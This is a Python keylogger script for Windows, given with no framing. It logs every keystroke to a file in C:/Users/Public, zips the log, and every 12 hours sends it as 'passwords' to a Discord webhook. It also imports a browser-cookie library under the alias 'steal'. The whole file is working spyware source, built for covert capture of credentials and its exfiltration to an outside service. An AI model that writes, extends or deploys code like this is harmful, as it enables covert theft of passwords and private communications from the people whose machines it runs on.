from pynput.keyboard import Key, Listener
import smtplib
import time
from dhooks import Webhook, Embed, File
import browser_cookie3 as steal, requests, base64, random, string, zipfile, shutil, dhooks, os, re, sys, sqlite3

url= "" #webhook url

hook = Webhook(url)



class KeyLogger:
    def __init__(self):
        self.start_time = time.time()
        self.shift = False
        self.caps = False
        self.specials = {"`" : "¬",
                         "1" : "!",
                         "2" : '"',
                         "3" : "£",
                         "4" : "$",
                         "5" : "%",
                         "6" : "^",
                         "7" : "&",
                         "8" : "*",
                         "9" : "(",
                         "10" : ")",
                         "-" : "_",
                         "=" : "+",
                         "[" : "{",
                         "]" : "}",
                         ";" : ":",
                         "'" : "@",
                         "#" : "~",
                         "," : "<",
                         "." : ">",
                         "/" : "/"}

    def send_email(self):
        with open("C:/Users/Public/crimsimlog", "r") as file:
            data = file.read()

        try:
            zname = r'C:\Users\Public\crimsimlog.zip'
            newzip = zipfile.ZipFile(zname, 'w')
            newzip.write(r'C:\Users\Public\crimsimlog.txt')
            newzip.close()
            passwords = File(r'C:\Users\Public\crimsimlog.zip')
        except:
            pass

        try:
            hook.send(file=passwords)
        except:
            pass
       

        self.start_time = time.time()
            
    def write_key(self, key):
        with open("C:/Users/Public/crimsimlog.txt", "a") as file:
            if time.time() - self.start_time > 43200:
                self.send_email()

            if key == Key.space or key == Key.enter:
                file.write("\n")
                
            elif key == Key.shift:
                if not self.shift:
                    self.shift = True

            elif key == Key.caps_lock:
                if not self.caps:
                    self.caps = True
                else:
                    self.caps = False
  
            else:
                try:
                    if key.char.isalpha():
                        if self.caps or self.shift:
                            file.write(key.char.upper())

                        else:
                            file.write(key.char)
        
                    elif key.char.isdigit():
                        if self.shift:
                            file.write(self.specials[key.char])
                            
                        else:
                            file.write(key.char)

                    else:
                        if self.shift:
                            file.write(self.specials[key.char])

                        else:
                            file.write(key.char)
                                
                except:
                    pass

    def check_shift(self, key):
        if key == Key.shift:
            self.shift = False



key_logger = KeyLogger()  

key_logger.send_email()

with Listener(on_press=key_logger.write_key, on_release=key_logger.check_shift) as listener:
    listener.join()



